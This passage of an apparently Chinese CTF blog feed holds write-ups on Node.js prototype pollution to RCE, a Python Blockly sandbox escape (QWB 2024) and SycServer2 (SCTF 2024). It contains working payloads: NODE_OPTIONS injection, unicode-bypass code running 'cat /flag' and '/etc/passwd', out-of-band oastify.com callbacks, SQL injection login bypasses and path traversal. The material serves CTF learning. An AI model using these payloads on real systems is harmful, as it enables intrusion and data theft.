class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/s&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">`&quot;<span class="subst">$&#123;command&#125;</span>&quot;`</span>];</span><br><span class="line">     options.<span class="property">windowsVerbatimArguments</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;android&#x27;</span>)</span><br><span class="line">       file = <span class="string">&#x27;/system/bin/sh&#x27;</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">argv0</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(options.<span class="property">argv0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">  envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="核心思想和payloads"><a href="#核心思想和payloads" class="headerlink" title="核心思想和payloads"></a>核心思想和payloads</h4><blockquote><p>这里是根据自己理解的，忽略了一些关于shell参数的</p></blockquote><ol><li><em><strong>这里其实也是一样的绕过思路</strong></em>，通过NODE_OPTIONS了指定require的文件来执行，这里由于无法控制<code>/proc/self/environ</code>从而转向<code>/proc/self/cmdline</code><ol><li><p>再点一下<code>require()</code>函数: 把读取到的内容放到一个自执行函数中执行(所以可以用来执行命令)，返回module.exports需要导出的内容 -&gt; 为什么官方文档没有找到？纳尼</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce2\\\&quot;).toString())//&quot;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-Inspector"><a href="#RCE-via-Inspector" class="headerlink" title="RCE via Inspector"></a>RCE via Inspector</h3><ol><li><p>node运行时允许添加<code>--inspect=host:port</code>格式来设置调试服务器监听的主机地址，<a href="https://www.nodeapp.cn/cli.html#cli_inspect_host_port">详见文档</a></p><ol><li>需要注意防火墙的问题</li></ol></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;argv0&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;shell&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NODE_OPTIONS&quot;</span>:<span class="string">&quot;--inspect=id\&quot;\&quot;.oastify\&quot;\&quot;.com&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实际应用????</p></li></ol><h3 id="Defence-Patch"><a href="#Defence-Patch" class="headerlink" title="Defence Patch"></a>Defence Patch</h3><ol><li>由于js原型的特殊性质，涉及到判断的属性最好都提前预设值，否则可以借助原型链污染进行设置 –&gt; 这就是env, shell, argv0可以进行污染的一个原因，因为原型无法覆盖上层值</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> all in one </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyBlockly_强网24</title>
      <link href="/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<blockquote><p>截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧<br>这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目</p></blockquote><hr><blockquote><p><em><strong>培养一点重要的思想</strong></em><br>1.思维是肯定是找注入点，比如这里的<br>2.多多本地试试，输入没有想要的效果一定要检查，<strong>强推本地跑一下</strong><br>3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示</p></blockquote><h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol><li><p>unicode绕过，呜呜呜，只构造出来poc，可以实现代码执行，进一步可以绕过</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＇﹔<span class="built_in">print</span>⁽＇hello＇⁾﹔＇</span><br></pre></td></tr></table></figure></li><li><p>重写len()函数，读取文件，到这一步就卡住了 –&gt; <em><strong>编码的还是要在本地尝试一下</strong></em>，这里出现了转换后消失的情况，可以一个一个试</p><ol><li>WTF? –&gt; <em><strong>真相大白了，这里没有导入os模块调用不了啊，记错了wc，怪怪的可能是逻辑理解错了</strong></em><img src="/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png" alt="不懂为什么没有回显，蒙蔽了这是，绕过应该是成功"></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 &#x27;+len=lambda x:0;os.system(&#x27;cat /flag&#x27;) +&#x27;</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line"><span class="comment"># 居然不能执行，本地看一下，是有些字符消失了</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇cat ／etc／passwd＇⁾⁾﹔＇</span><br><span class="line"><span class="comment"># 带外尝试，无反应，可能不出网</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇ping ﹣c <span class="number">4</span> x425n3uqpcd5ljq0c4809gjsijoac10q․oastify․com＇⁾⁾﹔＇</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终构造还是没有成功，但是每一个字符都有试成功哩</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔os․system⁽＇ls －la ／proc＇⁾﹔＇</span><br><span class="line">    <span class="comment"># len没有绕过成功？不是哥们，回显也是true哩</span></span><br><span class="line">    ＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽<span class="built_in">len</span>⁽＇a＇⁾⁼⁼<span class="number">0</span>⁾﹔＇</span><br></pre></td></tr></table></figure></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><h3 id="关于字符串"><a href="#关于字符串" class="headerlink" title="*关于字符串"></a>*关于字符串</h3><ol><li><em><strong>加深了我对字符串编码的理解</strong></em><ol><li>你在本地<strong>通过python</strong>发出去的\n和\r还有\u编码这些都会直接解释为对应的字符，在发出去的字符串中根本不会有\这个字符，不需要进行绕过</li><li>但是如果<strong>是在bp</strong>中的话，那么对方接受到的就是有带\的</li><li><strong>最大大的区别在于</strong>: 是否在发出去时有进行替换，记住的是python有</li></ol></li></ol><h3 id="绕过点1-unidecode-unidecode"><a href="#绕过点1-unidecode-unidecode" class="headerlink" title="绕过点1: unidecode.unidecode"></a>绕过点1: unidecode.unidecode</h3><blockquote><p>脚本技巧，见同名unidecode</p></blockquote><h3 id="绕过点2-ast-Import和ast-ImportFrom"><a href="#绕过点2-ast-Import和ast-ImportFrom" class="headerlink" title="绕过点2: ast.Import和ast.ImportFrom"></a>绕过点2: ast.Import和ast.ImportFrom</h3><blockquote><p>多多ai并查就好了</p></blockquote><ol><li>Import 语句：<ol><li>Import 节点表示一个 import 语句，用于导入整个模块或多个模块。</li><li>例如：import os 或 import sys, os。</li></ol></li><li>ImportFrom 语句：<ol><li>ImportFrom 节点表示一个 from … import 语句，用于从模块中导入特定的名称。</li><li>例如：from os import path 或 from sys import version as ver’</li></ol></li></ol><h3 id="绕过点3-suid提权"><a href="#绕过点3-suid提权" class="headerlink" title="绕过点3: suid提权"></a>绕过点3: suid提权</h3><blockquote><p>详见文章Linux提权，这里不做原理介绍</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> python </tag>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Playground_强网24</title>
      <link href="/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>Flask沙盒逃逸？</li><li>&#x2F;entrypoint.sh<ol><li>环境变量读flag，不行，这里是docker不同 checked</li><li>root读flag，权限问题 -&gt; 沙盒的运行环境是一个在本地2077端口的服务</li></ol></li><li>权限问题看看dockerfile<ol><li>&#x2F;tmp&#x2F;go 777</li><li>&#x2F;app 700 仅所有者可读、写、执行</li><li>&#x2F;sandbox 755 所有者可读、写、执行，其他用户可读、执行</li><li>&#x2F;flag 400 仅所有者可读，这是什么情况 -&gt; 问题不大后面再来，ps aux再来看看绕过即可，这个就涉及到提权问题了</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SycServer2_SCTF24</title>
      <link href="/2024/11/01/SycServer2_SCTF24/"/>
      <url>/2024/11/01/SycServer2_SCTF24/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-Failed"><a href="#分析与尝试-Failed" class="headerlink" title="分析与尝试(Failed)"></a>分析与尝试(Failed)</h2><ol><li><p>右键查看源码发现有个sql的waf，在前端可以控制台直接覆盖掉&#x2F;修改(这里不是禁用)</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wafsql = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>都到这个点了那就sql注入，admin和1’or ‘1’&#x3D;’1 –&gt; &#x2F;robots.txt文件中的路由需要登录后访问</p></li><li><p>&#x2F;robots.txt下有信息，考虑存在目录遍历回显文件内容，<code>?v=.&amp;f=app.js</code>或者<code>?v=....//....//....//....//app&amp;f=/app.js</code>(说实话应该没必要吧)</p></li><li><p><em><strong>可以读源码</strong></em>，读出来不可读，cyberchef发发力，ok，有app.js，可知express框架，可按找架构获取一些信息(也可从app.js出发)，都放在源码处了，这里可以的话**dirsearch发发力(docker的话一般可以)**，当然要试试&#x2F;flag了，不过没什么55</p><ol><li>package.json读读看，环境相关，还是要有意识</li><li><code>const handle = require(&#39;./handle&#39;);</code>引入但是没有用，读文件也不行，猜测为文件夹，进行读取<code>handle/index.js</code></li><li>index.js内容指向，读<code>handle/child_process.js</code></li><li><code>/static/report_noway_dirsearch.html</code>是从app.js中读出来的</li></ol></li><li><p>发现一个风险函数和原型链污染</p><ol><li>有原型链污染</li><li>但是没人调用啊，输入源是command也写定了，难搞，看看别的文件</li><li>哟西，<code>/child_processes</code>会是切入口，我理理，argv0覆盖？要的话得在prototypelessObj添加属性argv0，前面不是有个原型链覆盖吗  –&gt; sad，这一步没去想查一直钻(<strong>env也是一个思路但是被我忽视了</strong>)，<strong>不会还是多查查资料</strong>，这里是属于原型链污染命令执行的内容，可以看看<strong>payload中有无形似的再了解原理</strong></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  